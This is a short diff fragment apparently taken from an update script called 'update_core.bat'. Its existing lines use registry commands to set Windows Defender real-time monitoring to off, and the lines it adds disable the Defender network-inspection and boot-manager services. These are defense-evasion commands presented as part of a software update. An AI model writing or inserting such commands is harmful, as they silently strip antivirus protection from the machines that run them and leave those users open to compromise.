@@ -3,3 +3,5 @@ update_core.bat
 UpdateApp.cpp
 reg add HKLM\SOFTWARE\Microsoft\Windows Defender\Features /v "RealTimeMonitoring" /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows Defender\Features /v "Windows Defender" /t REG_DWORD /d 0 /f
+sc config "WdNisSvc" start= disabled
+sc config "WdBootManager" start= disabled
